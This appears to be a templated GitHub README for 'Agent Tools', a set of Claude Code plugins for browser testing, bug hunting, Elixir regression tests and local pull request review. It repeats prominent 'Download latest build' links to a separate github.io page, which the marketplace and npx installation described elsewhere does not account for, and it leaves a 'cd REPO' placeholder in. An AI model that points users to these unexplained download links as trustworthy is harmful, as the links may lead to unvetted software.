# Agent Tools - Claude Code Plugin Marketplace 2026

> **Agent Tools is a set of Claude Code extensions for engineering tasks, automated testing, code quality, browser-based workflows, and pull request analysis.**

[![Platform](https://img.shields.io/badge/Platform-Claude%20Code-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-latest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/kevingreenxxnr6478/agent-tools-claude-code?style=flat-square)](https://github.com/kevingreenxxnr6478/agent-tools-claude-code)

---

<p align="center">
  <a href="https://kevingreenxxnr6478.github.io/agent-tools-claude-code/">
    <img src="https://img.shields.io/badge/Download-Agent%20Tools%20Latest-brightgreen?style=for-the-badge" alt="Download Agent Tools">
  </a>
</p>

> **[Download Agent Tools latest build](https://kevingreenxxnr6478.github.io/agent-tools-claude-code/)**

---

[Download Latest Build](https://kevingreenxxnr6478.github.io/agent-tools-claude-code/)

---

## What Agent Tools Provides

Agent Tools adds a practical group of agent skills to Claude Code for common software development activities. Its capabilities cover browser-driven testing, regression test creation, file consistency analysis, bug discovery, and local pull request review.

Each extension is intended for repeatable workflows that produce organized, actionable results. Developers can obtain plugins through the Claude Code marketplace or install open agent skills with `npx`, then invoke the appropriate tool during their regular development work.

---

## Capabilities

- Coordinate browser tests from Gherkin specifications using Playwright MCP.
- Conduct focused, time-limited bug hunts and produce scored reports.
- Create regression tests for changes made to Elixir code.
- Check related files for consistency.
- Examine pull requests locally in an interactive web interface that supports pausing and resuming.
- Install extensions from the Claude Code marketplace.
- Add publicly available agent skills through `npx`.
- Enable development processes centered on testing and code quality.

---

## Getting Started

### Marketplace installation

1. Launch Claude Code in the project or environment where you plan to use Agent Tools.
2. Open the marketplace or the plugin installation flow.
3. Search for **Agent Tools** and complete the displayed installation steps.
4. Reload or restart Claude Code if the installation process asks you to do so.
5. Choose one of the installed skills when starting a compatible task.

### Install an open skill with `npx`

Follow the installation instructions associated with the open skill you want to use:

```bash
npx <agent-skill-package>
```

Substitute the package identifier for `<agent-skill-package>`.

### Clone the repository

```bash
git clone https://github.com/kevingreenxxnr6478/agent-tools-claude-code.git
cd REPO
```

Once the repository is available locally, use the documentation included with the relevant plugin or skill to complete its installation.

---

## Working with Agent Tools

The extensions fit into an ordinary Claude Code session and can be selected according to the task at hand.

### Browser-based testing

1. Write a Gherkin specification describing the behavior to test.
2. Begin the applicable Claude Code workflow.
3. Run the browser testing skill with Playwright MCP.
4. Examine the recorded test activity and the findings it produces.

### Time-boxed bug hunting

1. Choose the area to investigate and set a defined time limit.
2. Launch the bug-hunting workflow.
3. Evaluate the scored results.
4. Turn verified issues into appropriate development or testing work.

### Generating Elixir regression tests

1. Apply the planned change to the Elixir code.
2. Ask Agent Tools to generate regression coverage for the affected behavior.
3. Inspect the suggested tests.
4. Add or modify the tests in the project before executing the test suite.

### Reviewing a pull request locally

1. Launch the local pull request review workflow.
2. Visit the web interface it provides.
3. Examine and handle findings interactively.
4. Stop and continue the review later whenever necessary.

---

## Configuration

The exact configuration process is determined by the selected skill and the way Claude Code was installed. Start by reading the documentation for the relevant plugin or skill, then supply requested details such as project directories, test commands, browser targets, or review boundaries.

Project-level settings should remain with the project and follow the conventions used by Claude Code and the installed skill. When a workflow offers configurable values, consult its instructions before overriding the defaults.

---

## Requirements

- Claude Code.
- A project appropriate for the chosen engineering, testing, or review workflow.
- `npx` and its corresponding Node.js environment when installing open agent skills.
- Playwright MCP for browser-testing workflows that depend on it.
- Elixir tooling for regression test generation involving Elixir projects.
- A local environment capable of running the interactive pull request review web interface.
- Network connectivity may be needed to install marketplace plugins or open skills.

---

## Frequently Asked Questions

### What is the installation process for Agent Tools?

Install it through the Claude Code marketplace, or clone the repository and use the documentation for the skill you need. Open agent skills use the documented `npx` installation command.

### What types of workflows are available?

Agent Tools includes browser testing, scored bug investigation, Elixir regression test generation, consistency checking, and interactive pull request review on a local machine.

### Can a local pull request review be continued later?

Yes. The review workflow provides a resumable web UI, so an in-progress review does not need to be finished in a single session.

### Where should configuration be maintained?

Configuration is skill-specific. Read the instructions for the installed plugin or skill, and store project-specific settings with the appropriate Claude Code configuration.

### What are the first troubleshooting steps if installation does not work?

Verify that Claude Code is installed and available, then review the marketplace or skill installation instructions and confirm the required Node.js and `npx` setup. Check the reported error details as well. Browser workflows also require a working Playwright MCP installation.

### How do I receive updates?

Depending on the extension, updates can come through the Claude Code marketplace, this repository, or the installation mechanism used by an individual open skill. Review the current project documentation before performing an update.

---

## Planned Improvements

- Keep developing and polishing the available agent skills.
- Make software engineering workflows more consistent.
- Broaden the testing and code quality toolset.
- Improve interactive review and reporting workflows.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
